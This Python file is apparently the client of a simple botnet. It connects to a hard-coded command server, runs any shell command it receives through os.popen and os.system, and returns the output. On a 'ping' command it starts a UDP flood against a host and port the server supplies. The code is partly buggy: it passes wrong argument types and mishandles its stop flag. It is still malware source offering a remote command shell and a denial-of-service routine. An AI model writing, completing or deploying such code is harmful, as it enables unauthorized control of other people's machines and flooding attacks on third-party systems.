import socket, time, os, threading

#toggle dev mode
verbose = True


addr = ('127.0.0.1', 5002)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
stop = True
def init():
        while True:
                try:
                        try:
                                client.connect(addr)
                        except:
                                print(f'[NOTICE] Could not connect to {addr[0]}:{addr[1]}')
                                time.sleep(5)
                        client.send('client'.encode('utf-8'))
                        break
                except:
                        print(f'[ALERT] Connection with {addr[0]}:{addr[1]} closed')
                        
        main()

def udpflood(ip, port):
        global stop
        stop = False
        while True:
                if stop == True:
                        sock.close()
                        break
                        
                sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                try:
                        sock.sendto(623,(ip,int(port)))
                except:
                        sock.close
        





def main():
        shellmode = False
        if verbose:
                print(f'[CONNECTED] Connected to {addr[0]}:{addr[1]}')
        while True:
                msg = None
                msg = client.recv(1024)
                decoded = msg.decode('utf-8')
                if msg:
                    print('command recieved:', decoded)
                    if shellmode == True:
                            if 'stop' in decoded:
                                    shellmode = False
                            else:
                                    time.sleep(1)
                                    output_stream = os.popen(decoded)
                                    if os.system(decoded) != 0:
                                            client.send('Invalid Command'.encode('utf-8'))
                                    else:
                                            output = output_stream.read()
                                            if output:
                                                    client.send(output.encode('utf-8'))
                                            else:
                                                    client.send('empty output'.encode('utf-8'))
                            
                    else:
                            if decoded == 'shell':
                                    shellmode = True
                            if 'noping' in decoded:
                                    stop = True
                            if 'ping' in decoded:
                                    hostname = client.recv(1024).decode('utf-8')
                                    port = client.recv(1024)
                                    t1 = threading.Thread(target=udpflood, args=(hostname, port))
                                    t1.start()
                            
                            time.sleep(1)
                            
                            
            



init()
